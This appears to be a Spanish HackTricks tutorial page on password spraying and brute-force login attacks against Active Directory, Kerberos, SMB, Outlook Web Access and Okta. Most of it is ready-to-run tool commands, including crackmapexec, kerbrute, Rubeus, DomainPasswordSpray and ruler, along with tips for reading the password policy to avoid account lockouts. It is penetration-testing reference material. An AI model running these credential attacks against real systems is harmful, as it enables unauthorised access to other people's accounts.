# Ataque de Fuerza Bruta / Password Spraying

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Password Spraying**

Una vez que hayas encontrado varios **nombres de usuario válidos**, puedes probar las **contraseñas más comunes** (teniendo en cuenta la política de contraseñas del entorno) con cada uno de los usuarios descubiertos.\
Por **defecto**, la **longitud mínima** de la **contraseña** es de **7**.

Las listas de nombres de usuario comunes también pueden ser útiles: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Ten en cuenta que **podrías bloquear algunas cuentas si intentas varias contraseñas incorrectas** (por defecto más de 10).

### Obtener la política de contraseñas

Si tienes credenciales de algún usuario o una shell como usuario de dominio, puedes **obtener la política de contraseñas con**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Explotación desde Linux (o todos)

* Usando **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
* Utilizando [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
* [**spray**](https://github.com/Greenwolf/Spray) _**(puedes indicar el número de intentos para evitar bloqueos):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
* Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NO RECOMENDADO A VECES NO FUNCIONA
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
* Con el módulo `scanner/smb/smb_login` de **Metasploit**:

![](<../../.gitbook/assets/image (132) (1).png>)

* Utilizando **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Desde Windows

* Con la versión de [Rubeus](https://github.com/Zer1t0/Rubeus) con módulo de fuerza bruta:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
* Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Puede generar usuarios del dominio por defecto y obtendrá la política de contraseñas del dominio y limitará los intentos de acuerdo con ella):
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
* Con [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Fuerza Bruta

{% code overflow="wrap" %}
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
## Outlook Web Access

Existen múltiples herramientas para **password spraying en Outlook**.

* Con [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
* Con [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
* Con [Ruler](https://github.com/sensepost/ruler) (¡confiable!)
* Con [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
* Con [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Para utilizar cualquiera de estas herramientas, necesitas una lista de usuarios y una contraseña / una pequeña lista de contraseñas para realizar el spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
* [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
* [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referencias

* [https://ired.team/experimentos-de-seguridad-ofensiva/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/experimentos-de-seguridad-ofensiva/active-directory-kerberos-abuse/active-directory-password-spraying)
* [https://www.ired.team/seguridad-ofensiva/acceso-inicial/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/seguridad-ofensiva/acceso-inicial/password-spraying-outlook-web-access-remote-shell)
* www.blackhillsinfosec.com/?p=5296
* [https://hunter2.gitbook.io/darthsidious/acceso-inicial/password-spraying](https://hunter2.gitbook.io/darthsidious/acceso-inicial/password-spraying)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
